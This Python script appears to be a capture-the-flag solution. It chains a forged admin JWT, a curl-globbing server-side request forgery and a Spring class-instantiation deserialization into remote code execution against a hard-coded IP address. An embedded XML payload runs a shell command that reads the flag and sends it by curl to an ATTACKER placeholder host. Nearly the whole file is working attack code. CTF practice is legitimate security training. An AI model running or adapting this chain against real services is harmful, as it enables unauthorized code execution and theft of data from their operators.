"""
    1) Set JWT to admin=true.   
        - https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
    2) Curl globbing
        - https://everything.curl.dev/cmdline/globbing.html
    3) Class Instantiation
        - https://samuzora.com/posts/rwctf-2024/
"""

import httpx
from urllib.parse import quote


URL = "http://172.206.89.197:8090/"
#URL = "http://localhost:8090/"
ATTACKER = "https://ATTACKER/pov.xml"

""" pov.xml 
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="#{T(java.lang.Runtime).getRuntime().exec(
        new String[] {
        '/bin/bash', '-c', 'curl https://ATTACKER/?flag=$(/readflag|base64)'
        }
        )}"></bean>
</beans>
"""

# Set JWT admin true cookie
# Ref: https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
def get_admin_jwt(client):
    payload = {
        "firstName": "marce",
        "lastName": "loves",
        "favouriteCategory": "p4rra",
        "": {"admin": True}
    }
    r = client.post(URL, json=payload)
    print(f"[*] jwt: {r.cookies['jwt']}\n")
    assert "" != r.cookies['jwt']


# /admin update
def deserialization(client):
    build = '[{"type":"object","name":"TypeReference","value":"org.springframework.context.support.FileSystemXmlApplicationContext|' + ATTACKER + '"}]'
    payload = {'url': "http://{127.0.0.1:8090,@nicknameservice:5000/}/ExperimentalSerializer?serialized="+quote(build)}
    r = client.post(URL+'admin/update', data=payload)
    print(r.text)


client = httpx.Client()
get_admin_jwt(client)
deserialization(client)
